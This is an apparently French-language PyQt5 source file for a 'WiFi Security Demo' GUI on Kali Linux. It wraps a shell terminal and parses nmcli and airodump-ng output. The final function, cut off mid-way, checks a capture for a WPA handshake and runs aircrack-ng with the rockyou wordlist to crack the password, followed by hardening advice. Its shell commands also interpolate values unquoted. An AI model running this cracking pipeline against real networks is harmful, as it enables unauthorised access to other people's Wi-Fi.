#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║  WiFi Security Demo  ·  v4.0  ·  PyQt5  ·  Kali Linux           ║
║  CORRECTIONS v4:                                                  ║
║  ✔ Suppression codes ANSI (plus de □[0K□[1B)                     ║
║  ✔ Zoom terminal Ctrl+/Ctrl- et boutons + / -                    ║
║  ✔ Scan réseau → table automatiquement remplie                   ║
║  ✔ airodump-ng parsé et affiché proprement                       ║
║  ✔ Tous les boutons fonctionnels                                 ║
╚═══════════════════════════════════════════════════════════════════╝
python3 wifi_desktop.py
"""
import sys, os, re, glob, subprocess, secrets, string, math
from datetime import datetime

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QDialog,
    QVBoxLayout, QHBoxLayout, QGridLayout,
    QSplitter, QStackedWidget, QScrollArea,
    QLabel, QPushButton, QLineEdit, QPlainTextEdit,
    QComboBox, QSpinBox, QCheckBox, QProgressBar,
    QTableWidget, QTableWidgetItem, QHeaderView,
    QFrame, QGroupBox, QStatusBar, QAction, QToolBar,
    QSizePolicy, QMessageBox, QSplashScreen,
    QShortcut,
)
from PyQt5.QtCore  import Qt, QThread, pyqtSignal, QTimer, QSize
from PyQt5.QtGui   import (
    QFont, QColor, QPixmap, QPainter,
    QTextCursor, QTextCharFormat, QKeySequence,
)

# ══════════════════════════════════════════════════════════════════
#  PALETTE
# ══════════════════════════════════════════════════════════════════
BG="#060810"; BG1="#090d18"; BG2="#0c1120"; PANEL="#0f1828"
B1="#192540";  B2="#243255"
CYAN="#00d4ff"; RED="#ff2050"; GREEN="#00ff88"
ORANGE="#ff8c00"; YELLOW="#ffd600"; PURPLE="#a855f7"
TEXT="#b8cce0"; DIM="#3a5270"; WHITE="#eaf2fc"

# ══════════════════════════════════════════════════════════════════
#  STRIP ANSI — supprime TOUS les codes escape du terminal
# ══════════════════════════════════════════════════════════════════
ANSI_RE = re.compile(
    r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]'   # CSI sequences
    r'|\x1B[PX^_].*?\x1B\\'              # DCS/PM/APC/SOS
    r'|\x1B\][^\x07]*(?:\x07|\x1B\\)'   # OSC
    r'|\x1B[@-Z\\-_]'                    # Fe sequences
    r'|[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]'# C0/C1 control
)
def strip_ansi(text: str) -> str:
    return ANSI_RE.sub('', text).rstrip()

# ══════════════════════════════════════════════════════════════════
#  STYLESHEET
# ══════════════════════════════════════════════════════════════════
QSS = f"""
QMainWindow,QWidget,QDialog{{background:{BG};color:{TEXT};
  font-family:"JetBrains Mono","Courier New",monospace;font-size:11px;}}
QLabel{{color:{TEXT};background:transparent;}}
QScrollBar:vertical{{background:{BG};width:7px;margin:0;}}
QScrollBar::handle:vertical{{background:{B2};border-radius:3px;min-height:24px;}}
QScrollBar::handle:vertical:hover{{background:{DIM};}}
QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical{{height:0;border:none;}}
QScrollBar:horizontal{{background:{BG};height:6px;}}
QScrollBar::handle:horizontal{{background:{B2};border-radius:3px;}}
QScrollBar::add-line:horizontal,QScrollBar::sub-line:horizontal{{width:0;border:none;}}
QLineEdit{{background:{BG2};border:1px solid {B2};color:{WHITE};
  padding:6px 10px;border-radius:3px;
  font-family:"JetBrains Mono","Courier New",monospace;font-size:11px;}}
QLineEdit:focus{{border-color:{CYAN};}}
QComboBox{{background:{BG2};border:1px solid {B2};color:{WHITE};
  padding:5px 8px;border-radius:3px;}}
QComboBox::drop-down{{border:none;width:18px;}}
QComboBox QAbstractItemView{{background:{PANEL};border:1px solid {B2};
  color:{TEXT};selection-background-color:{B2};}}
QSpinBox{{background:{BG2};border:1px solid {B2};color:{WHITE};
  padding:4px 8px;border-radius:3px;}}
QSpinBox::up-button,QSpinBox::down-button{{background:{B1};border:none;width:16px;}}
QCheckBox{{color:{TEXT};spacing:8px;}}
QCheckBox::indicator{{width:14px;height:14px;border:1px solid {B2};
  background:{BG2};border-radius:2px;}}
QCheckBox::indicator:checked{{background:{CYAN};border-color:{CYAN};}}
QProgressBar{{background:{B1};border:none;border-radius:3px;
  text-align:center;color:transparent;}}
QProgressBar::chunk{{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,
  stop:0 {CYAN},stop:1 {PURPLE});border-radius:3px;}}
QTableWidget{{background:{BG};gridline-color:{B1};border:1px solid {B1};
  color:{TEXT};alternate-background-color:{BG1};
  selection-background-color:{B2};selection-color:{WHITE};}}
QTableWidget::item{{padding:5px 8px;}}
QHeaderView::section{{background:{BG2};color:{DIM};border:none;
  border-bottom:1px solid {B2};padding:6px 8px;font-size:9px;letter-spacing:1px;}}
QGroupBox{{border:1px solid {B1};border-radius:4px;margin-top:14px;
  padding:10px;color:{DIM};font-size:9px;letter-spacing:1px;}}
QGroupBox::title{{subcontrol-origin:margin;left:10px;padding:0 5px;color:{DIM};}}
QScrollArea{{border:none;background:transparent;}}
QSplitter::handle{{background:{B1};width:2px;height:2px;}}
QStatusBar{{background:{BG1};color:{DIM};border-top:1px solid {B1};font-size:10px;}}
QToolBar{{background:{BG1};border-bottom:1px solid {B1};spacing:3px;padding:2px 8px;}}
QToolButton{{background:transparent;border:1px solid {B2};color:{TEXT};
  padding:4px 12px;border-radius:2px;
  font-family:"JetBrains Mono",monospace;font-size:10px;}}
QToolButton:hover{{border-color:{CYAN};color:{CYAN};}}
QMessageBox{{background:{PANEL};}}
QMessageBox QLabel{{color:{TEXT};font-size:12px;}}
QMessageBox QPushButton{{background:transparent;border:1px solid {CYAN};
  color:{CYAN};padding:6px 18px;border-radius:3px;min-width:80px;}}
QMessageBox QPushButton:hover{{background:{CYAN};color:#000;}}
"""

# ══════════════════════════════════════════════════════════════════
#  NETWORKMANAGER AUTO-FIX — snippet bash réutilisable
#  Logique : si airmon-ng a tué NM → le redémarrer avant nmcli
# ══════════════════════════════════════════════════════════════════
# Ce bloc bash est injecté AVANT toute commande nmcli ou hotspot.
# Il :
#   1) Arrête wlan0mon si présent (mode moniteur encore actif)
#   2) Vérifie si NetworkManager tourne
#   3) Si non → sudo systemctl restart NetworkManager + attente 3s
#   4) Vérifie wlan0 géré par NM, sinon le force
NM_FIX = r"""
NM_FIX_DONE=0
# -- Arrêt mode moniteur si actif --
if iw dev wlan0mon info >/dev/null 2>&1; then
  echo "⚙  Mode moniteur détecté → arrêt wlan0mon…"
  sudo airmon-ng stop wlan0mon 2>&1 | grep -v "^$" || true
  NM_FIX_DONE=1
fi
# -- Vérif NetworkManager --
if ! systemctl is-active --quiet NetworkManager; then
  echo "⚙  NetworkManager arrêté → redémarrage…"
  sudo systemctl restart NetworkManager
  sleep 3
  NM_FIX_DONE=1
fi
# -- Forcer wlan0 sous NM si non géré --
if nmcli dev show wlan0 2>/dev/null | grep -q "unmanaged"; then
  echo "⚙  wlan0 non géré → nmcli device set wlan0 managed yes"
  sudo nmcli device set wlan0 managed yes
  sleep 1
  NM_FIX_DONE=1
fi
if [ "$NM_FIX_DONE" = "1" ]; then
  echo "✅ NetworkManager prêt"
fi
"""

def nm_fix_wrap(cmd: str) -> str:
    """Enveloppe une commande nmcli/hotspot avec la correction NM automatique."""
    # Échapper les singles quotes dans NM_FIX pour bash -c '...'
    fix = NM_FIX.replace("'", "'\\''")
    return f"bash -c '{fix}\n{cmd}'"

# ══════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════
def Btn(text, col=CYAN, sm=False):
    hfg = "#000" if col in (CYAN,GREEN,ORANGE,YELLOW) else "#fff"
    pad = "4px 8px" if sm else "8px 15px"
    fs  = "9px"    if sm else "10px"
    b   = QPushButton(text)
    b.setStyleSheet(f"""
        QPushButton{{background:transparent;border:1px solid {col};color:{col};
          padding:{pad};border-radius:3px;font-size:{fs};letter-spacing:.5px;
          font-family:"JetBrains Mono","Courier New",monospace;}}
        QPushButton:hover{{background:{col};color:{hfg};}}
        QPushButton:pressed{{background:{col}99;}}
        QPushButton:disabled{{border-color:{B2};color:{DIM};}}""")
    return b

def Lbl(txt, col=TEXT, size=11, bold=False):
    l=QLabel(txt)
    l.setStyleSheet(
        f"color:{col};font-size:{size}px;"
        f"font-weight:{'bold' if bold else 'normal'};background:transparent;")
    return l

def Inp(ph="", val="", fw=None):
    f=QLineEdit(); f.setPlaceholderText(ph)
    if val: f.setText(val)
    if fw:  f.setFixedWidth(fw)
    return f

def HRule():
    l=QFrame(); l.setFrameShape(QFrame.HLine)
    l.setStyleSheet(f"color:{B1};background:{B1};max-height:1px;"); return l

def CardF(accent=None):
    f=QFrame()
    f.setStyleSheet(
        f"QFrame{{background:{PANEL};border:1px solid {accent or B1}55;border-radius:4px;}}")
    return f

def TipW(text, kind="info"):
    K={"info":(CYAN,"rgba(0,212,255,.06)","rgba(0,212,255,.22)"),
       "warn":(ORANGE,"rgba(255,140,0,.06)","rgba(255,140,0,.22)"),
       "danger":(RED,"rgba(255,32,80,.06)","rgba(255,32,80,.22)"),
       "success":(GREEN,"rgba(0,255,136,.06)","rgba(0,255,136,.22)")}
    _,bg,bd=K.get(kind,K["info"])
    l=QLabel(text); l.setWordWrap(True); l.setTextFormat(Qt.RichText)
    l.setStyleSheet(
        f"QLabel{{background:{bg};border:1px solid {bd};border-radius:3px;"
        f"padding:10px 13px;color:{TEXT};font-size:11px;line-height:1.7;}}"); return l

class StatBox(QFrame):
    def __init__(self,val,lbl,col=CYAN):
        super().__init__()
        self.setStyleSheet(
            f"QFrame{{background:{PANEL};border:1px solid {B1};border-radius:3px;}}")
        lay=QVBoxLayout(self); lay.setContentsMargins(10,10,10,10); lay.setSpacing(2)
        self._n=QLabel(str(val)); self._n.setAlignment(Qt.AlignCenter)
        self._n.setStyleSheet(
            f"font-size:26px;font-weight:bold;color:{col};"
            f"background:transparent;border:none;"
            f"font-family:'JetBrains Mono',monospace;")
        t=QLabel(lbl); t.setAlignment(Qt.AlignCenter)
        t.setStyleSheet(
            f"font-size:9px;color:{DIM};letter-spacing:1px;"
            f"background:transparent;border:none;")
        lay.addWidget(self._n); lay.addWidget(t)
    def set(self,v): self._n.setText(str(v))

class SecMeter(QFrame):
    def __init__(self):
        super().__init__()
        self.setStyleSheet(
            f"QFrame{{background:{BG2};border:1px solid {B1};border-radius:3px;}}")
        lay=QVBoxLayout(self); lay.setContentsMargins(12,10,12,10); lay.setSpacing(6)
        self._bar=QProgressBar(); self._bar.setRange(0,100); self._bar.setValue(5)
        self._bar.setFixedHeight(14)
        self._bar.setStyleSheet(
            f"QProgressBar{{background:{BG};border-radius:7px;border:none;}}"
            f"QProgressBar::chunk{{background:{RED};border-radius:7px;}}")
        self._lbl=Lbl("Sélectionnez un réseau",DIM,12,True)
        lay.addWidget(Lbl("Score de sécurité:",DIM,10))
        lay.addWidget(self._bar); lay.addWidget(self._lbl)

    def update(self,sec):
        s=(sec or "").lower()
        if   not s or "open" in s: p,c,t=5, RED,    "CRITIQUE — Réseau ouvert"
        elif "wep"  in s:          p,c,t=15,"#ff6600","TRÈS FAIBLE — WEP"
        elif "wpa3" in s:          p,c,t=97,GREEN,  "EXCELLENT — WPA3"
        elif "wpa2" in s:          p,c,t=72,"#00cc66","BON — WPA2"
        elif "wpa"  in s:          p,c,t=40,YELLOW, "FAIBLE — WPA1"
        else:                      p,c,t=5, RED,    "INCONNU"
        self._bar.setValue(p)
        self._bar.setStyleSheet(
            f"QProgressBar{{background:{BG};border-radius:7px;border:none;}}"
            f"QProgressBar::chunk{{background:{c};border-radius:7px;}}")
        self._lbl.setText(t)
        self._lbl.setStyleSheet(
            f"color:{c};font-size:12px;font-weight:bold;background:transparent;border:none;")

# ══════════════════════════════════════════════════════════════════
#  THREAD COMMANDE — streaming non-bloquant
# ══════════════════════════════════════════════════════════════════
class CmdThread(QThread):
    line=pyqtSignal(str)
    done=pyqtSignal(int)

    def __init__(self,cmd,cwd):
        super().__init__()
        self.cmd=cmd; self.cwd=cwd
        self._proc=None; self._abort=False

    def run(self):
        env=os.environ.copy()
        env["TERM"]="dumb"          # ← empêche les codes couleur
        env["NO_COLOR"]="1"
        try:
            self._proc=subprocess.Popen(
                self.cmd,shell=True,executable="/bin/bash",
                stdout=subprocess.PIPE,stderr=subprocess.STDOUT,
                text=True,bufsize=1,cwd=self.cwd,env=env,
                preexec_fn=os.setsid)
            for ln in self._proc.stdout:
                if self._abort: break
                self.line.emit(strip_ansi(ln))  # ← strip ici
            self._proc.wait()
            self.done.emit(self._proc.returncode)
        except Exception as e:
            self.line.emit(f"[ERREUR] {e}")
            self.done.emit(-1)

    def abort(self):
        self._abort=True
        if self._proc:
            try:
                import signal
                os.killpg(os.getpgid(self._proc.pid),signal.SIGTERM)
            except Exception:
                try: self._proc.kill()
                except Exception: pass

# ══════════════════════════════════════════════════════════════════
#  PARSEURS RÉSEAU
# ══════════════════════════════════════════════════════════════════
def parse_nmcli(output: str) -> list:
    """Parse nmcli -t -f SSID,BSSID,SIGNAL,SECURITY output."""
    nets=[]
    for line in output.splitlines():
        line=strip_ansi(line).strip()
        if not line or line.startswith("SSID"): continue
        parts=line.split(":")
        if len(parts)>=4:
            # nmcli -t uses : as separator, BSSID has colons too
            # Format: SSID:XX\:XX\:XX\:XX\:XX\:XX:signal:security
            # Reconstruct properly
            ssid=parts[0]
            # BSSID is 6 hex pairs joined with \: in -t mode
            bssid_parts=[]
            i=1
            while i<len(parts) and len(bssid_parts)<6:
                bssid_parts.append(parts[i]); i+=1
            bssid=":".join(bssid_parts)
            signal=parts[i] if i<len(parts) else "?"
            security=" ".join(parts[i+1:]) if i+1<len(parts) else "Open"
            if not security.strip(): security="Open"
            try: sig=int(signal)
            except: sig=0
            nets.append({"ssid":ssid,"bssid":bssid,
                         "signal":sig,"security":security.strip()})
    return nets

def parse_nmcli_columns(output: str) -> list:
    """Parse nmcli dev wifi list - handles all output formats."""
    nets = []
    lines = [strip_ansi(l) for l in output.splitlines()]

    # Format 1: nmcli -f SSID,BSSID,SIGNAL,SECURITY (tab/space separated columns)
    # Detect by checking if we have a header line
    hdr_idx = -1
    for i, l in enumerate(lines):
        if "SSID" in l and "BSSID" in l:
            hdr_idx = i; break

    if hdr_idx >= 0:
        hdr = lines[hdr_idx]
        # Find column start positions
        cols = {}
        for name in ["SSID","BSSID","SIGNAL","BARS","SECURITY","MODE","CHAN","RATE"]:
            idx = hdr.find(name)
            if idx >= 0: cols[name] = idx

        col_order = sorted(cols.items(), key=lambda x: x[1])

        for l in lines[hdr_idx+1:]:
            if not l.strip() or l.strip().startswith("--"): continue
            clean = l.lstrip("* ")  # remove active marker *
            fields = {}
            for j, (name, start) in enumerate(col_order):
                end = col_order[j+1][1] if j+1 < len(col_order) else len(clean)
                fields[name] = clean[start:end].strip() if start < len(clean) else ""

            ssid   = fields.get("SSID","").strip()
            bssid  = fields.get("BSSID","").strip()
            sig    = fields.get("SIGNAL","").strip()
            sec    = fields.get("SECURITY","").strip()
            chan   = fields.get("CHAN","").strip()
            rate   = fields.get("RATE","").strip()

            if not ssid and not bssid: continue
            try: sig_int = int(sig)
            except: sig_int = 0
            nets.append({
                "ssid":     ssid or "<hidden>",
                "bssid":    bssid,
                "signal":   sig_int,
                "security": sec or "Open",
                "channel":  chan or "?",
                "rate":     rate or "?",
            })
        return nets

    # Format 2: nmcli -t (colon-separated)
    for l in lines:
        l = l.strip()
        if not l or l.startswith("SSID"): continue
        # Escape colons in BSSID: XX\:XX\:XX\:XX\:XX\:XX
        # Replace \: temporarily
        tmp = l.replace("\\:", "\x00")
        parts = tmp.split(":")
        parts = [p.replace("\x00", ":") for p in parts]
        if len(parts) >= 4:
            ssid = parts[0].lstrip("* ")
            bssid = parts[1]
            sig = parts[2]
            sec = ":".join(parts[3:]).strip()
            try: sig_int = int(sig)
            except: sig_int = 0
            nets.append({
                "ssid": ssid or "<hidden>",
                "bssid": bssid,
                "signal": sig_int,
                "security": sec or "Open",
            })
    return nets

def parse_airodump(output: str) -> list:
    """Parse airodump-ng output — extrait BSSID, canal, chiffrement."""
    nets=[]
    lines=[strip_ansi(l) for l in output.splitlines()]
    in_ap=False
    for l in lines:
        l=l.strip()
        if "BSSID" in l and "PWR" in l and "Beacons" in l:
            in_ap=True; continue
        if "BSSID" in l and "STATION" in l:
            in_ap=False; continue
        if not in_ap or not l: continue
        parts=l.split()
        if len(parts)<6: continue
        bssid=parts[0]
        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$',bssid): continue
        try:
            pwr=int(parts[1]); ch_idx=4
            ch=parts[ch_idx]; enc=parts[5] if len(parts)>5 else "?"
            cipher=parts[6] if len(parts)>6 else ""
            auth=parts[7]   if len(parts)>7 else ""
            # ESSID is at end after AUTH
            essid=" ".join(parts[10:]) if len(parts)>10 else "<hidden>"
            nets.append({"ssid":essid,"bssid":bssid,
                         "signal":abs(pwr),"channel":ch,
                         "security":f"{enc} {cipher}".strip()})
        except Exception: continue
    return nets

# ══════════════════════════════════════════════════════════════════
#  TERMINAL — VERSION CORRIGÉE
# ══════════════════════════════════════════════════════════════════
class Terminal(QWidget):
    notify  = pyqtSignal(str,str)
    networks= pyqtSignal(list)   # ← émet les réseaux parsés
    cap_ready = pyqtSignal(str)  # ← émet le chemin du .cap créé automatiquement

    FONT_MIN=8; FONT_MAX=22; FONT_DEF=11

    def __init__(self,parent=None):
        super().__init__(parent)
        self._hist=[]; self._hidx=-1
        self._thread=None
        self._cwd=os.path.expanduser("~")
        self._font_size=self.FONT_DEF
        self._output_buf=[]   # buffer pour parser les réseaux
        self._build()

    # ── Build ──────────────────────────────────────────────────────
    def _build(self):
        root=QVBoxLayout(self); root.setContentsMargins(0,0,0,0); root.setSpacing(5)

        # Barre titre
        bar=QHBoxLayout(); bar.setSpacing(8)
        self._dot=QLabel("●")
        self._dot.setStyleSheet(f"color:{GREEN};font-size:13px;")
        self._path=Lbl(f" {self._cwd}",CYAN,10)
        self._path.setTextInteractionFlags(Qt.TextSelectableByMouse)
        self._clock=Lbl("",DIM,10)
        # Boutons zoom
        bz_out=QPushButton("A-"); bz_in=QPushButton("A+"); bz_rst=QPushButton("A")
        for bz,tip in [(bz_out,"Zoom -"),(bz_in,"Zoom +"),(bz_rst,"Reset")]:
            bz.setToolTip(tip)
            bz.setFixedSize(26,22)
            bz.setStyleSheet(f"""
                QPushButton{{background:{B1};border:1px solid {B2};color:{DIM};
                  font-size:9px;border-radius:2px;padding:0;}}
                QPushButton:hover{{border-color:{CYAN};color:{CYAN};}}""")
        bz_out.clicked.connect(self.zoom_out)
        bz_in.clicked.connect(self.zoom_in)
        bz_rst.clicked.connect(self.zoom_reset)
        # Label indicateur zoom
        self._zoom_lbl=Lbl(f"{self._font_size}px",DIM,9)
        self._zoom_lbl.setFixedWidth(32)
        bar.addWidget(self._dot)
        bar.addWidget(Lbl("terminal@kali",DIM,9))
        bar.addWidget(Lbl("❯",CYAN,10))
        bar.addWidget(self._path,1)
        bar.addStretch()
        bar.addWidget(bz_out); bar.addWidget(bz_in); bar.addWidget(bz_rst)
        bar.addWidget(self._zoom_lbl)
        bar.addWidget(self._clock)
        root.addLayout(bar)

        # Zone sortie
        self.output=QPlainTextEdit()
        self.output.setReadOnly(True)
        self.output.setSizePolicy(QSizePolicy.Expanding,QSizePolicy.Expanding)
        self._apply_font()
        root.addWidget(self.output,1)

        # Chips historique
        ca=QScrollArea(); ca.setWidgetResizable(True); ca.setFixedHeight(30)
        ca.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        ca.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        ca.setStyleSheet("border:none;background:transparent;")
        self._cw=QWidget(); self._cl=QHBoxLayout(self._cw)
        self._cl.setContentsMargins(0,0,0,0); self._cl.setSpacing(4)
        self._cl.addStretch(); ca.setWidget(self._cw)
        root.addWidget(ca)

        # Ligne saisie
        row=QHBoxLayout(); row.setSpacing(7)
        prm=QLabel("❯")
        prm.setStyleSheet(f"color:{CYAN};font-size:16px;font-weight:bold;")
        prm.setFixedWidth(18)
        self.inp=QLineEdit()
        self.inp.setPlaceholderText(
            "  Entrez une commande Linux…   "
            "ex: ls -la  ·  nmap -sn 192.168.1.0/24  ·  aircrack-ng …")
        self.inp.setStyleSheet(f"""
            QLineEdit{{background:{PANEL};border:1px solid {B2};border-radius:4px;
              color:{WHITE};padding:10px 14px;
              font-family:"JetBrains Mono","Courier New",monospace;font-size:12px;}}
            QLineEdit:focus{{border-color:{CYAN};background:{BG2};}}""")
        self.inp.returnPressed.connect(self.execute)
        self.inp.keyPressEvent=self._keypress

        self.b_exec =Btn("▶  EXÉCUTER",CYAN);      self.b_exec.setFixedWidth(118)
        self.b_stop =Btn("■  STOP",RED,sm=True);    self.b_stop.setFixedWidth(80)
        self.b_clear=Btn("✕  EFFACER",DIM,sm=True); self.b_clear.setFixedWidth(85)
        self.b_copy =Btn("⎘  COPIER",DIM,sm=True);  self.b_copy.setFixedWidth(80)

        self.b_exec.clicked.connect(self.execute)
        self.b_stop.clicked.connect(self.stop)
        self.b_clear.clicked.connect(self.clear)
        self.b_copy.clicked.connect(self.copy_all)

        row.addWidget(prm); row.addWidget(self.inp,1)
        row.addWidget(self.b_exec); row.addWidget(self.b_stop)
        row.addWidget(self.b_clear); row.addWidget(self.b_copy)
        root.addLayout(row)

        # Progress
        self.prog=QProgressBar(); self.prog.setFixedHeight(3)
        self.prog.setRange(0,0); self.prog.setVisible(False)
        root.addWidget(self.prog)

        # Timer + raccourcis zoom
        QTimer(self).timeout.connect(self._tick) if False else None
        t=QTimer(self); t.timeout.connect(self._tick); t.start(1000)

        QShortcut(QKeySequence("Ctrl+="),self,self.zoom_in)
        QShortcut(QKeySequence("Ctrl++"),self,self.zoom_in)
        QShortcut(QKeySequence("Ctrl+-"),self,self.zoom_out)
        QShortcut(QKeySequence("Ctrl+0"),self,self.zoom_reset)

        self._welcome()

    def _apply_font(self):
        self.output.setStyleSheet(f"""
            QPlainTextEdit{{
                background:#010306; border:1px solid {B1}; border-radius:4px;
                color:#8abcd1;
                font-family:"JetBrains Mono","Courier New",monospace;
                font-size:{self._font_size}px;
                padding:10px 12px;
                selection-background-color:{B2};
                line-height:1.65;
            }}""")
        font=QFont("JetBrains Mono",self._font_size)
        font.setFixedPitch(True)
        self.output.setFont(font)

    # ── Zoom — 100% silencieux, indicateur dans barre titre seulement
    def zoom_in(self):
        if self._font_size < self.FONT_MAX:
            self._font_size += 1
            self._apply_font()
            self._zoom_lbl.setText(f"{self._font_size}px")

    def zoom_out(self):
        if self._font_size > self.FONT_MIN:
            self._font_size -= 1
            self._apply_font()
            self._zoom_lbl.setText(f"{self._font_size}px")

    def zoom_reset(self):
        self._font_size = self.FONT_DEF
        self._apply_font()
        self._zoom_lbl.setText(f"{self._font_size}px")

    def _welcome(self):
        self._w("╔══════════════════════════════════════════════════════╗",B2)
        self._w("║  🔐  WiFi Security Demo  ·  Terminal Kali Linux  v4   ║",CYAN)
        self._w("╚══════════════════════════════════════════════════════╝",B2)
        self._w("")
        self._w(f"  Répertoire : {self._cwd}",DIM)
        self._w("  ↑ / ↓         historique des commandes",DIM)
        self._w("  Ctrl+ / Ctrl-  zoom du texte  (ou boutons A+ / A-)",DIM)
        self._w("  Chips          cliquer = rejouer une commande",DIM)
        self._w("")

    def _tick(self):
        self._clock.setText(datetime.now().strftime("%H:%M:%S"))

    # ── Clavier ────────────────────────────────────────────────────
    def _keypress(self,ev):
        k=ev.key()
        if k==Qt.Key_Up:
            if self._hist and self._hidx<len(self._hist)-1:
                self._hidx+=1; self.inp.setText(self._hist[-(self._hidx+1)])
        elif k==Qt.Key_Down:
            if self._hidx>0:
                self._hidx-=1; self.inp.setText(self._hist[-(self._hidx+1)])
            elif self._hidx==0:
                self._hidx=-1; self.inp.clear()
        elif k==Qt.Key_Tab:
            txt=self.inp.text()
            if txt:
                last=txt.split()[-1] if txt.split() else txt
                r=subprocess.run(
                    f"compgen -f -- {last} 2>/dev/null | head -1",
                    shell=True,capture_output=True,text=True)
                if r.stdout.strip():
                    parts=txt.split(); parts[-1]=r.stdout.strip()
                    self.inp.setText(" ".join(parts)); self.inp.end(False)
        else:
            QLineEdit.keyPressEvent(self.inp,ev)

    # ── Exécution ──────────────────────────────────────────────────
    def execute(self):
        cmd=self.inp.text().strip()
        if not cmd: return
        if not self._hist or self._hist[-1]!=cmd:
            self._hist.append(cmd)
            if len(self._hist)>120: self._hist.pop(0)
        self._hidx=-1; self._refresh_chips(); self.inp.clear()
        self._output_buf=[]
        self._w(f"\n❯  {cmd}",CYAN)

        if re.match(r'^cd(\s|$)',cmd): self._cd(cmd); return
        if cmd.strip() in ('clear','cls'): self.clear(); return
        if cmd.strip()=='pwd': self._w(f"  {self._cwd}",TEXT); return

        if self._thread and self._thread.isRunning():
            self._thread.abort(); self._thread.wait(1500)

        self._thread=CmdThread(cmd,self._cwd)
        self._thread.line.connect(self._on_line)
        self._thread.done.connect(self._on_done)
        self._thread.start()
        self.prog.setVisible(True)
        self.b_exec.setEnabled(False)
        self._dot.setStyleSheet(f"color:{ORANGE};font-size:13px;")

    def _cd(self,cmd):
        parts=cmd.split(None,1)
        tgt=parts[1] if len(parts)>1 else os.path.expanduser("~")
        tgt=os.path.normpath(os.path.expandvars(os.path.expanduser(
            tgt if os.path.isabs(tgt) else os.path.join(self._cwd,tgt))))
        try:
            os.chdir(tgt); self._cwd=os.getcwd()
            self._path.setText(f" {self._cwd}")
            self._w(f"  → {self._cwd}",GREEN)
        except FileNotFoundError: self._w(f"  cd: {tgt}: Introuvable",RED)
        except PermissionError:   self._w(f"  cd: {tgt}: Refusé",RED)

    def _on_line(self,raw):
        line=strip_ansi(raw)   # double sécurité
        self._output_buf.append(line)

        l=line.lower()
        if   any(x in l for x in ['error','erreur','failed','fatal','denied',
                                    'refused','invalid','not found','cannot']):
            col=RED
        elif any(x in l for x in ['key found','passphrase','found it',
                                    'success','done','complete']):
            col=GREEN
        elif any(x in l for x in ['warning','warn']):
            col=ORANGE
        elif any(x in l for x in ['bssid','ssid','wpa','wep','channel',
                                    'essid','enc ','cipher']):
            col=CYAN
        else:
            col=TEXT
        if line.strip():
            self._w(f"  {line}",col)

    def _on_done(self,code):
        self.prog.setVisible(False); self.b_exec.setEnabled(True)
        col=GREEN if code==0 else RED
        self._w(f"\n  ──── terminé  (code: {code}) ────\n",col)
        self._dot.setStyleSheet(f"color:{GREEN};font-size:13px;")
        try: self._cwd=os.getcwd(); self._path.setText(f" {self._cwd}")
        except Exception: pass
        self.notify.emit(f"Commande terminée (code {code})",
                         "ok" if code==0 else "err")
        # Tenter de parser les réseaux
        full="\n".join(self._output_buf)
        nets=parse_nmcli_columns(full)
        if not nets: nets=parse_nmcli(full)
        if not nets: nets=parse_airodump(full)
        if nets: self.networks.emit(nets)
        # Détecter si un .cap vient d'être créé par le pipeline auto
        import re as _re
        for ln in self._output_buf:
            m=_re.search(r'(/\S+\.cap)', ln)
            if m:
                cap_path=m.group(1)
                if os.path.exists(cap_path):
                    self.cap_ready.emit(cap_path)
                    break

    # ── API publique ───────────────────────────────────────────────
    def run(self,cmd):
        self.inp.setText(cmd); self.execute()

    def stop(self):
        if self._thread and self._thread.isRunning():
            self._thread.abort()
            self._w("\n  [ Processus interrompu ]\n",ORANGE)
        self.prog.setVisible(False); self.b_exec.setEnabled(True)
        self._dot.setStyleSheet(f"color:{GREEN};font-size:13px;")

    def clear(self):
        self.output.clear()
        self._w("  [ Terminal effacé ]",DIM)

    def copy_all(self):
        QApplication.clipboard().setText(self.output.toPlainText())
        self._w("  [ Copié dans le presse-papier ]",GREEN)

    def note(self,txt,col=None):
        self._w(f"  ℹ  {txt}",col or DIM)

    def _w(self,txt,col=None):
        cur=self.output.textCursor(); cur.movePosition(QTextCursor.End)
        fmt=QTextCharFormat(); fmt.setForeground(QColor(col or TEXT))
        cur.insertText(txt+"\n",fmt)
        self.output.setTextCursor(cur); self.output.ensureCursorVisible()

    def _refresh_chips(self):
        while self._cl.count()>1:
            it=self._cl.takeAt(0)
            if it.widget(): it.widget().deleteLater()
        for cmd in reversed(self._hist[-10:]):
            short=cmd[:28]+("…" if len(cmd)>28 else "")
            c=QPushButton(short); c.setToolTip(cmd)
            c.setStyleSheet(f"""
                QPushButton{{background:{BG2};border:1px solid {B2};
                  color:{DIM};padding:1px 8px;border-radius:10px;
                  font-size:9px;font-family:"JetBrains Mono",monospace;}}
                QPushButton:hover{{border-color:{CYAN};color:{CYAN};}}""")
            c.setFixedHeight(22)
            c.clicked.connect(lambda _,x=cmd: self.run(x))
            self._cl.insertWidget(0,c)
    def auto_aircrack(self, bssid, capfile="capture.cap"):
        # Vérifie handshake
        hs_check = subprocess.getoutput(f"aircrack-ng {capfile}")
        if "WPA handshake" not in hs_check:
            self._w("❌ Aucun handshake détecté. Relancez la capture + déauth.", "red")
            return

        self._w("✅ Handshake détecté — lancement du crack…", "green")

        # Lance aircrack-ng avec dictionnaire
        result = subprocess.getoutput(
            f"sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b {bssid} {capfile}"
        )

        # Affiche résultat brut
        self._w(result, "cyan")

        # Conseils après résultat
        advice = (
            "\n--- Conseils ---\n"
            "• Si mot de passe trouvé → il est trop faible.\n"
            "• Utiliser WPA3 si possible.\n"
            "• Choisir un mot de passe robuste (12+ caractères).\n"
            "• Surveiller le trafic avec Wireshark."
        )
        self._w(advice, "yellow")

        # Sauvegarde rapport PDF
        from reportlab.pdfgen import canvas
        from reportlab.lib.pagesizes import A4
        c = canvas.Canvas("rapport_aircrack.pdf", pagesize=A4)
        c.setFont("Helvetica-Bold", 14)
        c.drawString(50, 800, "Rapport Aircrack-ng - Sécurité Wi-Fi")
